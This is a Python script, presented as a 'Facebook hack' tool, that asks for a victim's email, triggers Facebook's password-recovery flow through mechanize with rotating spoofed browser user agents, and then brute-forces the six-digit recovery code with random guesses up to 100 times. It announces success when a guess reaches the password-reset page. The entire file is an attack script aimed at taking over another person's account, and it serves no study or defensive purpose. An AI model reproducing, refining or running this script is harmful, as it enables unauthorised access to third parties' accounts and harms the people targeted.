##############################
# <!-- Coder By Badrddin--->
##############################

import mechanize
import os,time
import random
from random import choice

br = mechanize.Browser()
br.set_handle_equiv( True )
br.set_handle_gzip( True )
br.set_handle_redirect( True )
br.set_handle_referer( True )
br.set_handle_robots( False )
br.set_handle_refresh( mechanize._http.HTTPRefreshProcessor(), max_time = 1)


    
us1="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1"
us2= "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
us3= "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
us4="Mozilla/5.0 (Linux; U; Android 4.3; de-de; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
r_u=(us1,us2,us3,us4)
            
user_r=(choice(r_u))

br.addheaders = [ ( 'User-agent',user_r )]


time.sleep(1)
os.system("clear")
print('''

   +======================================+
    |--  F A C E B O O K   H A C K       |
    |------------------------------------|
    |                                    |
    |  Coder by: @ m. Badrddin   ^-^     |
    |------------------------------------|
    |         INSTA: @dll.0x             |
   +======================================+

''')
  
ema=input("[+] Email Victime :")
if '@' in ema:


    for n in range(100):


        
        url = "https://mbasic.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&multiple_results=0&from_login_screen=0&_rdr"
        br.open(url)
        br.select_form(nr=0)

        br.form['email'] = ema

        response = br.submit()
        url=(str("https://mbasic.facebook.com/recover/code/?ars=facebook_login&em%5B0%5D="+ema+"&rm=send_email&c=%2Flogin%2F&hash=AUZ2zxmFuC8S15oMakA&_rdr"))
                    
        br.open(url)
        br.select_form(nr=0)

        a=str(random.randint(100000,999999))
        
        br.form['n'] = a
        response = br.submit()
                
        if 'password' in response.geturl():
            print('-----------------------------------')
            print('[+] Hack is successfully', a)
            print('-----------------------------------')
            break;
            
        
        else:
            
            print('[!] Failed ==>', a)
else:
    print('!!! EMAIL ERROR !!!')

